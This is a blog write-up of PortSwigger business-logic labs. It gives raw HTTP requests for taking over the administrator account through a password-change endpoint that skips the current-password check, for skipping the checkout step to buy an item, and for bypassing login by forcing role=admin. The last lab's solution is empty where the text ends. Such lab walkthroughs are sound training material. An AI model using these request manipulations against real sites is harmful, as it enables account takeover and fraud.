---
title: Portswigger Business Logic Labs 2
date: 2026-10-20
categories:
  - - Writeups
tags:
  - Web
  - Portswigger
cover: /images/lain6.jpeg
---

Tackling more  Business Logic Labs from Portswigger

<!-- more -->

---

## Lab: Weak isolation on dual-use endpoint

### Description

>This lab makes a flawed assumption about the user's privilege level based on their input. As a result, you can exploit the logic of its account management features to gain access to arbitrary users' accounts. To solve the lab, access the `administrator` account and delete the user `carlos`.
>You can log in to your own account using the following credentials: `wiener:peter`

### Solve

Test credentials -> `wiener:peter`.

We login and inspect the `account management features`  where the flaw lives. The only feature is a password change functionality. 

![](images/235.png)

HTTP Request:

```http
POST /my-account/change-password HTTP/2
Host: 0a3c00450328e2bb80c971580028008a.web-security-academy.net
Cookie: session=jU6d5iRCKYEeLQM0yLEHDqWgqT1k2oqi
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8r
Content-Type: application/x-www-form-urlencoded
Content-Length: 111

csrf=$&username=wiener&current-password=$&new-password-1=$&new-password-2=$
```

The username is included in the request and we can change it to our target account `administrator` . But comes the issue , we don't know the current password??

What if we remove the `current password` parameter , will it still work?? Lets see:

![](images/234.png)
It worked . Let's delete `carlos`:

![](images/1111.png)

In this case the `dual-use endpoint` means that the `/my-account/change-password` is used by the admin users to change users passwords while also being used by users to change their own passwords.

## Lab: Insufficient workflow validation

### Description

>This lab makes flawed assumptions about the sequence of events in the purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".
>You can log in to your own account using the following credentials: `wiener:peter`

### Solve

Goal -> `buy a "Lightweight l33t leather jacket"`

What we Know -> `The Lab makes flawed assumptions about the sequence of events in the purchasing workflow.`

The Flow when buying an item:

*1.Add the item to cart*

HTTP request:
```http
POST /cart HTTP/2
Host: 0a53000503ad74448297a1df00cd009c.web-security-academy.net
Cookie: session=yygHV0cj2KQTsHTBS4VeG53LYQqEy6OW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

productId=16&redir=PRODUCT&quantity=1
```

*2.Place Order:*

HTTP request:

```http
POST /cart/checkout HTTP/2
Host: 0a53000503ad74448297a1df00cd009c.web-security-academy.net
Cookie: session=yygHV0cj2KQTsHTBS4VeG53LYQqEy6OW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

csrf=EalyvLe6xOIqkbW0YAnHwSoblM74RJwl
```

Depending with if the request is successful or not you get:

*1.Error* :

```http
GET /cart?err=INSUFFICIENT_FUNDS HTTP/2
Host: 0a53000503ad74448297a1df00cd009c.web-security-academy.net
Cookie: session=yygHV0cj2KQTsHTBS4VeG53LYQqEy6OW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

```

*2.Successful:*

```http
GET /cart/order-confirmation?order-confirmed=true HTTP/2
Host: 0a53000503ad74448297a1df00cd009c.web-security-academy.net
Cookie: session=yygHV0cj2KQTsHTBS4VeG53LYQqEy6OW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

```

To solve the lab , what i found , we need to skip the checkout and replace it with the successful request , that is when we place the order:

![](images/23.png)

## Lab: Authentication bypass via flawed state machine

### Description

>This lab makes flawed assumptions about the sequence of events in the login process. To solve the lab, exploit this flaw to bypass the lab's authentication, access the admin interface, and delete the user `carlos`.
>You can log in to your own account using the following credentials: `wiener:peter`

### Solve

Once again the bug exists only in the authentication flow so that is what we will focus on.

#### Authentication flow

1.Send `Post /login`

```http
POST /login HTTP/2
Host: 0a8d00b20336f66a8108a723005e001c.web-security-academy.net
Cookie: session=sDamO0mM2rqSyim670AlBLun0z1tz5Wp
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 68


csrf=tfMNU48J6ndwDU5pYAEw4exiOOEIa0Lz&username=wiener&password=peter
```

2.Send `GET /role-selector`

```http
GET /role-selector HTTP/2
Host: 0a8d00b20336f66a8108a723005e001c.web-security-academy.net
Cookie: session=bbpN2EmEiJQAsV8ktVDEAdKjKwJVaKUY
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

```

3.Send `Post /role-selector`

```http
POST /role-selector HTTP/2
Host: 0a8d00b20336f66a8108a723005e001c.web-security-academy.net
Cookie: session=wXiuGuHAfC4qSGwpumfbRmomNOcqoAon
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 57


role=content-author&csrf=NKLjc0N03qNzOWXyhi6jdvmawtbUydFU
```

The `role` parameter is very interesting.

#### Trying to Exploit

The description clearly says we need to break the above sequence . Logically , the step we need to skip is the `Get /role-selector` since this request boxes us as a user(is what i presume).

So , with intercept on in burp , go through the normal flow , but when you get to `Get /role-selector` , which is the redirect location of /login , replace it with the `POST /role-selector` request and change `role=admin` and the cookie to your current session cookie. Then send.

You'll get the error `invalid csrf token` . Ignore it and visit `/admin` and delete the target to solve the lab.

![](images/23445.png)


## Lab: Infinite money logic flaw

### Description

>This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".
>You can log in to your own account using the following credentials: `wiener:peter`


### Solve
